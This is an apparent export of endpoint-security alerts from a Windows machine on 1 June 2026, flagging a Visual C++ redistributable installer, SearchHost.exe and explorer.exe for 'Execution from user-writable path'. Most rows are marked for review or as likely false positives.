"Jun 1, 2026 @ 14:21:46.356",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1046\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-6E86B9DA
"Jun 1, 2026 @ 14:21:46.355",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1046\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-9374917A
"Jun 1, 2026 @ 14:21:46.352",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1045\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-EDB5023B
"Jun 1, 2026 @ 14:21:46.351",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1045\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-00F92314
"Jun 1, 2026 @ 14:21:46.350",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1042\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-7659A30F
"Jun 1, 2026 @ 14:21:47.397",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\BootstrapperApplicationData.xml,,deletion,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-86F64820
"Jun 1, 2026 @ 14:21:46.342",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1036\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-5B30CFE3
"Jun 1, 2026 @ 14:21:46.341",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1036\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-3EC5070C
"Jun 1, 2026 @ 14:21:46.340",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1031\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-7C140CED
"Jun 1, 2026 @ 14:21:46.339",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1031\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-BD3E78E2
"Jun 1, 2026 @ 14:21:46.337",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1029\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-8B46AEA5
"Jun 1, 2026 @ 14:21:46.335",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1029\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-563578A3
"Jun 1, 2026 @ 14:21:46.334",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1028\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-B5E243FB
"Jun 1, 2026 @ 14:21:46.333",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1028\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-DA5047DC
"Jun 1, 2026 @ 14:21:46.330",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-160CA454
"Jun 1, 2026 @ 14:21:46.329",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\logo.png,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D26CBF8A
"Jun 1, 2026 @ 14:21:46.328",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-FD91C23A
"Jun 1, 2026 @ 14:23:34.454",C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\systemapps\microsoftwindows.client.cbs_cw5n1h2txyewy\searchhost.exe,,,,C:\Users\DELL\AppData\Local\Packages\microsoftwindows.client.cbs_cw5n1h2txyewy\AC\Microsoft\Internet Explorer\DOMStore\NGHKBUH6\www.bing[1].xml,,overwrite,"5,408",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-6B468803
"Jun 1, 2026 @ 14:23:34.204",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\Primus.xlsx.lnk,,creation,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-880B29C3
"Jun 1, 2026 @ 14:23:34.169",C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\systemapps\microsoftwindows.client.cbs_cw5n1h2txyewy\searchhost.exe,,,,C:\Users\DELL\AppData\Local\Packages\microsoftwindows.client.cbs_cw5n1h2txyewy\AC\INetCache\50WOOR01\fpconfig.min[1].json,,creation,"5,408",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-45ABAD63
"Jun 1, 2026 @ 14:23:33.420",C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\systemapps\microsoftwindows.client.cbs_cw5n1h2txyewy\searchhost.exe,,,,C:\Users\DELL\AppData\Local\Packages\microsoftwindows.client.cbs_cw5n1h2txyewy\AC\Microsoft\Internet Explorer\DOMStore\NGHKBUH6\www.bing[1].xml,,overwrite,"5,408",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-18CFDA09
"Jun 1, 2026 @ 14:21:46.981",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.be\VC_redist.x86.exe,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-A8C06718
"Jun 1, 2026 @ 14:23:41.539",C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\systemapps\microsoftwindows.client.cbs_cw5n1h2txyewy\searchhost.exe,,,,C:\Users\DELL\AppData\Local\Packages\microsoftwindows.client.cbs_cw5n1h2txyewy\AC\Microsoft\Internet Explorer\DOMStore\NGHKBUH6\www.bing[1].xml,,overwrite,"5,408",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-162E89C3
"Jun 1, 2026 @ 14:21:46.327",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\thm.xml,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-6D52022D
"Jun 1, 2026 @ 14:21:46.326",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\wixstdba.dll,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-C826FAB3
"Jun 1, 2026 @ 14:21:46.301",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,,,load,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-A9179B14
"Jun 1, 2026 @ 14:21:46.217",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x86.exe,"""C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe"" -burn.clean.room=""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x86.exe"" -burn.filehandle.attached=784 -burn.filehandle.self=592 /quiet /norestart",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,,,start,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-EE140E04
"Jun 1, 2026 @ 14:21:45.853",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x64.exe,"""C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe"" -burn.clean.room=""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x64.exe"" -burn.filehandle.attached=772 -burn.filehandle.self=776 /quiet /norestart",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,,,end,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-451EEBCE
"Jun 1, 2026 @ 14:21:45.830",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Users\DELL\AppData\Local\Temp\dd_vcredist_amd64_20260601142144.log,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-C6A0D886
"Jun 1, 2026 @ 14:21:45.828",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-0BFB9F36
"Jun 1, 2026 @ 14:21:45.825",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\BootstrapperApplicationData.xml,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-021BEC8F
"Jun 1, 2026 @ 14:21:46.349",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1042\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-F504F222
"Jun 1, 2026 @ 14:21:46.347",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1041\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-1245D5B4
"Jun 1, 2026 @ 14:21:46.346",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1041\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D1740023
"Jun 1, 2026 @ 14:21:46.345",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1040\license.rtf,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-A482AC97
"Jun 1, 2026 @ 14:21:46.344",C:\Windows\Temp\{27E1843A-2F51-4486-B11C-361AB8D51008}\.cr\vc_redist.x86.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{27e1843a-2f51-4486-b11c-361ab8d51008}\.cr\vc_redist.x86.exe,,,,C:\Windows\Temp\{4D6017BE-87C2-47B2-8E1B-AA3353D660BA}\.ba\1040\thm.wxl,,creation,"34,308",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-139C0FBE
"Jun 1, 2026 @ 14:21:45.816",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1042\thm.wxl,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-60F6AD3B
"Jun 1, 2026 @ 14:21:45.814",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\license.rtf,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-667D9F22
"Jun 1, 2026 @ 14:21:45.812",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1036\thm.wxl,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-5F94BA7A
"Jun 1, 2026 @ 14:21:45.811",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1036\license.rtf,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-A9B1B147
"Jun 1, 2026 @ 14:21:45.809",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1029\thm.wxl,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-364BE834
"Jun 1, 2026 @ 14:21:45.807",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\license.rtf,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-5E12686B
"Jun 1, 2026 @ 14:21:45.801",C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,"""C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe"" -q -burn.elevated BurnPipe.{FD3536DD-AD15-4793-9C3D-00E8EC7346A4} {DD33A804-169E-4732-A47A-2CFD6A306981} 29508",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{78d4ddb5-69a4-4e33-8d81-c18d0fee1b6e}\.be\vc_redist.x64.exe,,,,,,end,"15,060",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-27D06E7E
"Jun 1, 2026 @ 14:21:45.764",C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{78d4ddb5-69a4-4e33-8d81-c18d0fee1b6e}\.be\vc_redist.x64.exe,,,,C:\ProgramData\Package Cache\{d8bbe9f9-7c5b-42c6-b715-9ee898a2e515}\state.rsm,,overwrite,"15,060",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-AAE4471A
"Jun 1, 2026 @ 14:21:45.749",C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{78d4ddb5-69a4-4e33-8d81-c18d0fee1b6e}\.be\vc_redist.x64.exe,,,,C:\ProgramData\Package Cache\{d8bbe9f9-7c5b-42c6-b715-9ee898a2e515}\state.rsm,,overwrite,"15,060",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-340A78B7
"Jun 1, 2026 @ 14:21:44.505",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x64.exe,"""C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe"" -burn.clean.room=""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x64.exe"" -burn.filehandle.attached=772 -burn.filehandle.self=776 /quiet /norestart",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,,,start,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-F340B7FA
"Jun 1, 2026 @ 14:21:44.632",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-66C341C2
"Jun 1, 2026 @ 14:21:44.631",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1045\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-C28EDDC2
"Jun 1, 2026 @ 14:21:44.630",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1045\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-E36A13AE
"Jun 1, 2026 @ 14:21:44.628",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1042\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-77D49CC6
"Jun 1, 2026 @ 14:21:44.627",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1042\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-491CFB95
"Jun 1, 2026 @ 14:21:44.626",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-B598E935
"Jun 1, 2026 @ 14:21:44.624",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1041\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-9651653F
